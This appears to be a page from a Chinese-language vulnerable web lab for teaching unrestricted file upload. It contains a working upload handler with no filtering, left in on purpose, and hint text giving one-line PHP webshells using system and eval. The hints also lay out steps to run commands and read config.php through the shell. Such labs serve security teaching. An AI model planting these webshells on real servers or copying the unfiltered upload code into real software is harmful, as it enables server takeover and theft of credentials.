<div class="panel fade-in">
    <div class="level-info">
        <span class="level-dot easy"></span>
        <span class="badge badge-easy">简单</span>
        <h2 style="margin:0">⬆️ 文件上传基础 - 无过滤上传</h2>
    </div>

    <div class="alert alert-info">
        <strong>📖 模块说明：</strong>本模块演示了没有任何过滤的文件上传漏洞。
        攻击者可以上传任意类型的文件（包括WebShell）到服务器上。
    </div>

    <div class="vuln-code">
        <span class="vuln-label">⚠️ 漏洞代码</span>
        <pre>&lt;?php
// 没有任何过滤！直接保存上传的文件
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["file"]["name"]);
move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
echo "文件已上传: " . $target_file;
?&gt;</pre>
    </div>

    <h3>📤 上传文件</h3>
    <form method="POST" enctype="multipart/form-data">
        <div class="form-group">
            <label for="file">选择文件：</label>
            <input type="file" name="file" id="file" required>
        </div>
        <button type="submit" name="upload" class="submit-btn">上传 ⬆️</button>
    </form>

    <?php
    if (isset($_POST['upload'])) {
        if ($_FILES['file']['error'] !== UPLOAD_ERR_OK) {
            echo '<div class="alert alert-danger">上传失败：' . $_FILES['file']['error'] . '</div>';
        } else {
            $upload_dir = __DIR__ . '/../uploads/';
            $filename = basename($_FILES['file']['name']);
            $target = $upload_dir . $filename;

            if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
                $web_path = 'uploads/' . $filename;
                echo '<div class="alert alert-success">';
                echo '<strong>✅ 文件上传成功！</strong><br>';
                echo '文件名：<code>' . htmlspecialchars($filename) . '</code><br>';
                echo '大小：' . round(filesize($target) / 1024, 2) . ' KB<br>';
                echo '类型：' . htmlspecialchars($_FILES['file']['type']) . '<br>';
                echo '访问路径：<a href="' . $web_path . '" target="_blank"><code>' . htmlspecialchars($web_path) . '</code></a><br>';

                // 如果是PHP文件，直接给出执行链接
                if (preg_match('/\.php$/i', $filename)) {
                    echo '<br><a href="' . $web_path . '?cmd=id" target="_blank" class="submit-btn success">执行PHP文件 →</a>';
                }
                echo '</div>';
            } else {
                echo '<div class="alert alert-danger">文件保存失败！</div>';
            }
        }
    }
    ?>

    <h3>📋 已上传文件列表</h3>
    <div class="output-box">
        <?php
        $upload_dir = __DIR__ . '/../uploads/';
        $files = scandir($upload_dir);
        foreach ($files as $f) {
            if ($f !== '.' && $f !== '..' && $f !== '.gitkeep') {
                $fpath = $upload_dir . $f;
                $size = filesize($fpath);
                $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
                $icon = ($ext === 'php') ? '🐘' : (in_array($ext, ['jpg','png','gif']) ? '🖼️' : '📄');
                echo htmlspecialchars("{$icon} {$f}  ({$size} bytes)") . "\n";
            }
        }
        ?>
    </div>

    <div class="tip-collapse">
        <div class="tip-header">💡 通关提示</div>
        <div class="tip-content">
            <p><strong>目标：</strong>上传一个PHP WebShell并执行系统命令。</p>
            <p><strong>WebShell代码：</strong></p>
            <div class="source-code">
                <pre><span class="php">&lt;?php @system($_GET['cmd']); ?&gt;</span></pre>
                <pre><span class="php">&lt;?php @eval($_POST['cmd']); ?&gt;</span></pre>
            </div>
            <p><strong>步骤：</strong></p>
            <ol>
                <li>创建一个 <code>shell.php</code> 文件，内容为 <code>&lt;?php @system($_GET['cmd']); ?&gt;</code></li>
                <li>上传该文件</li>
                <li>访问 <code>uploads/shell.php?cmd=id</code> 查看结果</li>
                <li>尝试读取 <code>config.php</code>：<code>uploads/shell.php?cmd=cat ../config.php</code></li>
            </ol>
        </div>
    </div>
</div>
